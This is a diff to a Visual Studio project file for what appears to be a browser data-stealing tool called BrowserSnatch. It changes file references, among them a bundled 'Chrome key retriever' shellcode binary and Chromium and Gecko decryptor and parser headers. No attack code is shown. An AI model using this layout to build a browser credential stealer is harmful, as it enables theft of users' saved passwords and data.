@@ -142,15 +142,15 @@
     <ClCompile Include="Visualizer.cpp" />
   </ItemGroup>
   <ItemGroup>
-    <None Include="..\load.bin" />
+    <None Include="..\Chrome_key_retriever_shellcode\extract_key.bin" />
     <None Include="packages.config" />
   </ItemGroup>
   <ItemGroup>
-    <ClInclude Include="Definitions.h" />
     <ClInclude Include="includes\ChromiumDecryptor.h" />
     <ClInclude Include="includes\ChromiumParser.h" />
     <ClInclude Include="includes\DataDump.h" />
     <ClInclude Include="includes\DataHolder.h" />
+    <ClInclude Include="includes\Definitions.h" />
     <ClInclude Include="includes\GeckoDecryptor.h" />
     <ClInclude Include="includes\GeckoParser.h" />
     <ClInclude Include="includes\Helper.h" />
@@ -158,6 +158,7 @@
     <ClInclude Include="includes\sqlite3.h" />
     <ClInclude Include="includes\Visualizer.h" />
     <ClInclude Include="resource.h" />
+    <ClInclude Include="resource1.h" />
   </ItemGroup>
   <ItemGroup>
     <ResourceCompile Include="BrowserSnatch.rc" />
